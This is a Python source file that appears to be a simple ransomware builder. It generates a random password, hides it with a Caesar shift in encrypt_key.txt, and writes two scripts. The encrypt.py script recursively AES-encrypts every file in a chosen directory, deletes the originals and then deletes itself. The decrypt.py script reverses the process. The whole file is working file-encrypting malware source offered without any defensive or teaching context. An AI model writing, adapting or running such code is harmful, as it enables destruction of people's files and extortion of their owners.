import random
import string
import sys
from argparse import ArgumentParser

parser = ArgumentParser()
parser.add_argument("-p", "--path", dest="path", help="Select path like: \"usr/bin/Foledr\" or \"C:\\My\\Folder\" or included folders relative to this file: \"\\Included\\folder\" ")
args = parser.parse_args()

if (args.path == None):
    parser.print_help()
    sys.exit()

directory = args.path

pswd_decrypt = ""
for i in range(26):
	pswd_decrypt += random.choice(string.ascii_letters)

c_key = random.randint(1, 26)

pswd_encrypt = ""

for i in range(len(pswd_decrypt)):
	letter = pswd_decrypt[i]
	if letter.isupper():
		i = ord(letter)
		i = i + c_key
		if i > 90:
			i = i - 26
		pswd_encrypt += chr(i)
	elif letter.islower():
		i = ord(letter)
		i = i + c_key
		if i > 122:
			i = i - 26
		pswd_encrypt += chr(i)
	
file = open("encrypt_key.txt", "w")
file.write(pswd_encrypt)
file.close()

print("[#] pswd_encrypt = " + str(pswd_encrypt))
print("[#] key = " + str(c_key))
print("[#] pswd_decrypt = " + str(pswd_decrypt))

with open("encrypt.py", "w") as encryptf:
	encryptf.write(
'''import os
import pyAesCrypt
import sys

def encrypt(filename):
	password = '''+"\""+str(pswd_decrypt)+"\""+'''
	bufferSize = 512 * 1024
	pyAesCrypt.encryptFile(str(filename), str(filename)+".aes", password, bufferSize)
	print("[+] File '''+ "\'" +'''" + str(filename) + "'''+ "\'" +''' has been encrypted")
	os.remove(filename)

def collect(dir):
	for i in os.listdir(dir):
		way = os.path.join(dir, i)
		if os.path.isfile(way):
			encrypt(way)
		else:
			collect(way)

collect(r'''+"\'"+str(directory)+"\'"+''')
os.remove(str(sys.argv[0]))
''')

with open("decrypt.py", "w") as decrypt:
	decrypt.write(
'''import os
import sys
import pyAesCrypt

pswd_decrypt = "" 
c_key = '''+str(c_key)+'''
text = open("encrypt_key.txt", "r")
tr = text.read()
text.close()
os.remove("encrypt_key.txt")

for i in range(len(tr)):
	letter = tr[i]
	if letter.isupper():
		i = ord(letter)
		i = i - c_key
		if i < 65:
			i = i + 26
		pswd_decrypt += chr(i)
	elif letter.islower():
		i = ord(letter)
		i = i - c_key
		if i < 97:
			i = i + 26
		pswd_decrypt += chr(i)
	
file = open("decrypt_key.txt", "w")
file.write(pswd_decrypt)
file.close()

def decrypt(filename):
	password = pswd_decrypt
	bufferSize = 512 * 1024
	pyAesCrypt.decryptFile(str(filename), str(os.path.splitext(filename)[0]), password, bufferSize)
	print("[+] File '''+ "\'" +'''" + str(filename) + "'''+ "\'" +''' has been decrypted")
	os.remove(filename)

def collect(dir):
	for i in os.listdir(dir):
		way = os.path.join(dir, i)
		if os.path.isfile(way):
			try:
				decrypt(way)
			except:
				pass
		else:
			collect(way)

collect(r'''+"\'"+str(directory)+"\'"+''')
os.remove(str(sys.argv[0]))

''')